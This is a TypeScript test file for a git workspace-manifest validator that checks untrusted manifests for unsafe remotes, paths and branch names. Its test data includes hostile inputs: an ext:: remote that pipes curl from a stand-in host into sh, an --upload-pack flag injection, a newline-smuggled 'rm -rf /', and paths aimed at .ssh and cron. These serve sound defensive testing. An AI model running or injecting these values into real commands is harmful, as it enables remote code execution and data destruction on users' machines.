import { describe, expect, it, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, mkdir, writeFile, readdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execa } from 'execa';
import {
  cleanManifest, hasEmbeddedCredentials, isSafeBranch, isSafeRelPath, isSafeRemote,
  readManifest, redactRemote, WORKSPACE_VERSION, WorkspaceValidationError,
  type WorkspaceManifest,
} from '../src/workspace.js';
import { buildManifest, joinWorkspace } from '../src/commands/workspace.js';

/**
 * A workspace manifest is UNTRUSTED INPUT that drives `git clone` into the
 * joiner's filesystem, so most of what is pinned here is refusal: a manifest
 * must not be able to place a repo outside the target folder, hand git a
 * command-executing URL, or smuggle a flag through a branch name.
 */

/* ---------------- pure validation ---------------- */

describe('redactRemote', () => {
  it('strips an embedded credential but keeps the repo identifiable', () => {
    expect(redactRemote('https://user:ghp_secret@github.com/acme/api.git'))
      .toBe('https://github.com/acme/api.git');
    expect(hasEmbeddedCredentials('https://user:ghp_secret@github.com/acme/api.git')).toBe(true);
  });

  it('leaves an scp-like remote alone — `git@host` is a username, not a secret', () => {
    expect(redactRemote('git@github.com:acme/api.git')).toBe('git@github.com:acme/api.git');
    expect(hasEmbeddedCredentials('git@github.com:acme/api.git')).toBe(false);
  });

  it('leaves a plain https remote untouched', () => {
    expect(redactRemote('https://github.com/acme/api.git')).toBe('https://github.com/acme/api.git');
  });
});

describe('isSafeRemote', () => {
  it('accepts the forms people actually use', () => {
    expect(isSafeRemote('https://github.com/acme/api.git')).toBe(true);
    expect(isSafeRemote('ssh://git@github.com/acme/api.git')).toBe(true);
    expect(isSafeRemote('git@github.com:acme/api.git')).toBe(true);
    expect(isSafeRemote('/srv/mirrors/api.git')).toBe(true);
  });

  /*
   * The one that matters. `ext::` makes git run an arbitrary command, so a
   * manifest carrying it is remote code execution on whoever runs `baton join`.
   * util/exec.ts already pins protocol.ext.allow=never; this is the visible lock.
   */
  it('refuses a command-executing transport', () => {
    expect(isSafeRemote('ext::sh -c "curl evil.example|sh"')).toBe(false);
    expect(isSafeRemote('ext::git-upload-pack')).toBe(false);
  });

  it('refuses unauthenticated git:// — it cannot prove what it served', () => {
    expect(isSafeRemote('git://github.com/acme/api.git')).toBe(false);
  });

  it('refuses a value that could be read as a flag or break the argv slot', () => {
    expect(isSafeRemote('--upload-pack=touch /tmp/pwn')).toBe(false);
    expect(isSafeRemote('-x')).toBe(false);
    expect(isSafeRemote('https://ok.example/a\nrm -rf /')).toBe(false);
    expect(isSafeRemote('')).toBe(false);
    expect(isSafeRemote('z'.repeat(500))).toBe(false);
  });
});

describe('isSafeRelPath', () => {
  it('accepts a nested relative destination', () => {
    expect(isSafeRelPath('api-server')).toBe(true);
    expect(isSafeRelPath('services/api')).toBe(true);
  });

  // Placing a clone outside the folder the user named is the whole threat.
  it('refuses anything that escapes the target folder', () => {
    expect(isSafeRelPath('../outside')).toBe(false);
    expect(isSafeRelPath('a/../../b')).toBe(false);
    expect(isSafeRelPath('..')).toBe(false);
    expect(isSafeRelPath('/etc/cron.d')).toBe(false);
    expect(isSafeRelPath('C:\\Windows')).toBe(false);
    expect(isSafeRelPath('\\\\server\\share')).toBe(false);
    expect(isSafeRelPath('//server/share')).toBe(false);
    expect(isSafeRelPath('.')).toBe(false);
    expect(isSafeRelPath('')).toBe(false);
  });
});

describe('isSafeBranch', () => {
  it('accepts real branch names and refuses flag-shaped ones', () => {
    expect(isSafeBranch('main')).toBe(true);
    expect(isSafeBranch('release/2.1')).toBe(true);
    expect(isSafeBranch('--upload-pack=x')).toBe(false);
    expect(isSafeBranch('-b')).toBe(false);
    expect(isSafeBranch('a..b')).toBe(false);
    expect(isSafeBranch('has space')).toBe(false);
    expect(isSafeBranch('')).toBe(false);
  });
});

describe('cleanManifest', () => {
  const ok = (over: Partial<WorkspaceManifest> = {}): unknown => ({
    version: WORKSPACE_VERSION,
    createdAt: '2026-07-30T00:00:00.000Z',
    projects: [{ id: 'api', remote: 'https://github.com/acme/api.git', path: 'api', defaultBranch: 'main' }],
    ...over,
  });

  it('accepts a well-formed manifest', () => {
    const m = cleanManifest(ok());
    expect(m.projects).toHaveLength(1);
    expect(m.projects[0].defaultBranch).toBe('main');
  });

  it('refuses a version it does not understand rather than guessing', () => {
    expect(() => cleanManifest(ok({ version: 99 }))).toThrow(WorkspaceValidationError);
    expect(() => cleanManifest(ok({ version: undefined }))).toThrow(WorkspaceValidationError);
  });

  it('refuses non-objects and empty project lists', () => {
    expect(() => cleanManifest(null)).toThrow(WorkspaceValidationError);
    expect(() => cleanManifest('nope')).toThrow(WorkspaceValidationError);
    expect(() => cleanManifest(ok({ projects: [] }))).toThrow(WorkspaceValidationError);
  });

  it('refuses a traversing path, naming the offending project', () => {
    expect(() => cleanManifest(ok({
      projects: [{ id: 'evil', remote: 'https://h/r.git', path: '../../.ssh' }],
    }))).toThrow(/unsafe path/);
  });

  it('refuses a command-executing remote', () => {
    expect(() => cleanManifest(ok({
      projects: [{ id: 'evil', remote: 'ext::sh -c evil', path: 'evil' }],
    }))).toThrow(/refusing remote/);
  });

  // Two entries writing one directory means the second silently wins.
  it('refuses duplicate ids and duplicate destinations', () => {
    expect(() => cleanManifest(ok({
      projects: [
        { id: 'api', remote: 'https://h/a.git', path: 'a' },
        { id: 'api', remote: 'https://h/b.git', path: 'b' },
      ],
    }))).toThrow(/duplicate project id/);
    expect(() => cleanManifest(ok({
      projects: [
        { id: 'a', remote: 'https://h/a.git', path: 'same' },
        { id: 'b', remote: 'https://h/b.git', path: 'same' },
      ],
    }))).toThrow(/share the path/);
  });

  it('caps the project count', () => {
    const many = Array.from({ length: 60 }, (_, i) => ({ id: `p${i}`, remote: 'https://h/r.git', path: `p${i}` }));
    expect(() => cleanManifest(ok({ projects: many }))).toThrow(/max 50/);
  });
});

/* ---------------- end-to-end clone behaviour ---------------- */

let src: string;
let target: string;

/** A real git repo with one commit, usable as a local clone source. */
async function makeRepo(dir: string, file = 'README.md'): Promise<string> {
  await mkdir(dir, { recursive: true });
  await execa('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  await writeFile(join(dir, file), '# fixture\n', 'utf-8');
  await execa('git', ['add', '-A'], { cwd: dir });
  await execa('git', [
    '-c', 'user.email=fixture@example.com', '-c', 'user.name=Fixture', 'commit', '-qm', 'init',
  ], { cwd: dir });
  return dir;
}

beforeEach(async () => {
  src = await mkdtemp(join(tmpdir(), 'baton-ws-src-'));
  target = await mkdtemp(join(tmpdir(), 'baton-ws-dst-'));
});
afterEach(async () => {
  await rm(src, { recursive: true, force: true });
  await rm(target, { recursive: true, force: true });
});

const manifestFor = (projects: WorkspaceManifest['projects']): WorkspaceManifest =>
  cleanManifest({ version: WORKSPACE_VERSION, createdAt: new Date(0).toISOString(), projects });

describe('joinWorkspace', () => {
  it('reproduces the folder layout, including a nested path', async () => {
    const api = await makeRepo(join(src, 'api'));
    const web = await makeRepo(join(src, 'web'));
    const out = await joinWorkspace(manifestFor([
      { id: 'api', remote: api, path: 'api-server' },
      { id: 'web', remote: web, path: 'apps/web' },
    ]), target);

    expect(out.map((o) => o.status)).toEqual(['cloned', 'cloned']);
    expect(existsSync(join(target, 'api-server', '.git'))).toBe(true);
    // the nested destination is created, not flattened
    expect(existsSync(join(target, 'apps', 'web', '.git'))).toBe(true);
    expect(existsSync(join(target, 'apps', 'web', 'README.md'))).toBe(true);
  });

  /*
   * The expected real-world failure is auth/network on one repo out of five, so
   * re-running the same command must complete the remainder instead of failing
   * on what already landed.
   */
  it('is idempotent — a second run reports present and touches nothing', async () => {
    const api = await makeRepo(join(src, 'api'));
    const m = manifestFor([{ id: 'api', remote: api, path: 'api' }]);

    expect((await joinWorkspace(m, target))[0].status).toBe('cloned');
    const second = await joinWorkspace(m, target);
    expect(second[0].status).toBe('present');
    expect(second[0].detail).toMatch(/already cloned/);
  });

  it('completes the remaining repos after a partial failure', async () => {
    const api = await makeRepo(join(src, 'api'));
    const m = manifestFor([
      { id: 'api', remote: api, path: 'api' },
      { id: 'gone', remote: join(src, 'does-not-exist'), path: 'gone' },
    ]);

    const first = await joinWorkspace(m, target);
    expect(first[0].status).toBe('cloned');
    expect(first[1].status).toBe('failed');

    // the missing source appears; re-running finishes the job without redoing api
    await makeRepo(join(src, 'does-not-exist'));
    const second = await joinWorkspace(m, target);
    expect(second.map((o) => o.status)).toEqual(['present', 'cloned']);
  });

  // Cloning on top of someone's existing work is unrecoverable, so it is refused.
  it('refuses to clobber a non-empty directory', async () => {
    const api = await makeRepo(join(src, 'api'));
    await mkdir(join(target, 'api'), { recursive: true });
    await writeFile(join(target, 'api', 'my-work.txt'), 'do not delete me', 'utf-8');

    const out = await joinWorkspace(manifestFor([{ id: 'api', remote: api, path: 'api' }]), target);
    expect(out[0].status).toBe('failed');
    expect(out[0].detail).toMatch(/not empty/);
    // the user's file survived
    expect(await readdir(join(target, 'api'))).toContain('my-work.txt');
  });

  it('refuses a directory holding a different repo rather than merging into it', async () => {
    const api = await makeRepo(join(src, 'api'));
    const other = await makeRepo(join(src, 'other'));
    await joinWorkspace(manifestFor([{ id: 'x', remote: other, path: 'api' }]), target);

    const out = await joinWorkspace(manifestFor([{ id: 'x', remote: api, path: 'api' }]), target);
    expect(out[0].status).toBe('failed');
    expect(out[0].detail).toMatch(/different repo/);
  });

  it('checks out the branch the manifest names', async () => {
    const api = await makeRepo(join(src, 'api'));
    await execa('git', ['branch', 'develop'], { cwd: api });
    const out = await joinWorkspace(
      manifestFor([{ id: 'api', remote: api, path: 'api', defaultBranch: 'develop' }]), target);
    expect(out[0].status).toBe('cloned');
    const head = await execa('git', ['symbolic-ref', '--short', 'HEAD'], { cwd: join(target, 'api') });
    expect(head.stdout.trim()).toBe('develop');
  });
});

describe('readManifest', () => {
  it('rejects a traversing manifest read from disk, before any clone runs', async () => {
    const file = join(target, 'evil.json');
    await writeFile(file, JSON.stringify({
      version: WORKSPACE_VERSION,
      projects: [{ id: 'evil', remote: 'https://h/r.git', path: '../../escaped' }],
    }), 'utf-8');
    await expect(readManifest(file)).rejects.toThrow(/unsafe path/);
  });

  it('reports a missing or malformed file clearly', async () => {
    await expect(readManifest(join(target, 'nope.json'))).rejects.toThrow(/cannot read manifest/);
    const bad = join(target, 'bad.json');
    await writeFile(bad, '{not json', 'utf-8');
    await expect(readManifest(bad)).rejects.toThrow(/not valid JSON/);
  });
});

describe('buildManifest', () => {
  it('describes a hub of several repos with their remotes and branches', async () => {
    const origin = await makeRepo(join(src, 'origin-api'));
    const hub = join(src, 'hub');
    await mkdir(hub, { recursive: true });
    await execa('git', ['clone', '-q', origin, join(hub, 'api')]);

    const { manifest, skipped } = await buildManifest(hub);
    expect(skipped).toHaveLength(0);
    expect(manifest.projects).toHaveLength(1);
    expect(manifest.projects[0].path).toBe('api');
    expect(manifest.projects[0].remote).toBe(origin);
    expect(manifest.projects[0].defaultBranch).toBe('main');
  });

  /*
   * A repo with no `origin` cannot be cloned by anyone else. Writing it with an
   * empty remote would produce an entry that silently yields nothing on join, so
   * it is reported as skipped instead.
   */
  it('skips a repo with no origin instead of emitting an uncloneable entry', async () => {
    const hub = join(src, 'hub2');
    await makeRepo(join(hub, 'local-only'));
    const withOrigin = await makeRepo(join(src, 'origin-b'));
    await execa('git', ['clone', '-q', withOrigin, join(hub, 'shared')]);

    const { manifest, skipped } = await buildManifest(hub);
    expect(manifest.projects.map((p) => p.path)).toEqual(['shared']);
    expect(skipped.map((s) => s.name)).toEqual(['local-only']);
    expect(skipped[0].why).toMatch(/origin/);
  });

  it('throws when there is nothing cloneable at all', async () => {
    const empty = join(src, 'empty-hub');
    await mkdir(empty, { recursive: true });
    await expect(buildManifest(empty)).rejects.toThrow(WorkspaceValidationError);
  });
});
